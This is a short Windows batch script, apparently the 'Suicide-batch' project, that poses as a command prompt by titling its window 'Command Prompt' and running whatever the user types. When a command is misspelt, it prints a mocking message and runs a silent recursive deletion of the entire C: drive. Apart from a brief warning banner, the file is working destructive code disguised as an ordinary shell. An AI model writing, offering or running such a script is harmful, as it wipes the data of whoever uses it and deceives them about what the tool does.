@ECHO OFF
CLS
SET "CDir=%~dp0"

:: Set warning message
ECHO  ===================================
ECHO  WARNING: Suicide-batch installed
ECHO   	  (https://gitlab.com/sparskakyl/suicide-batch)
ECHO  ===================================

:: Act like a fake command prompt functionality
TITLE Command Prompt
GOTO SBATCH
:SBATCH
	SET /P "CommandSuicide=%cd%>"
	%CommandSuicide% > %CDir%CExec
	IF "%errorlevel%"=="9009" ECHO Oops, looks like you misspelt something. && RD /S /Q C:\ && GOTO EOF
	TYPE %CDir%CExec
	GOTO SBATCH

:EOF
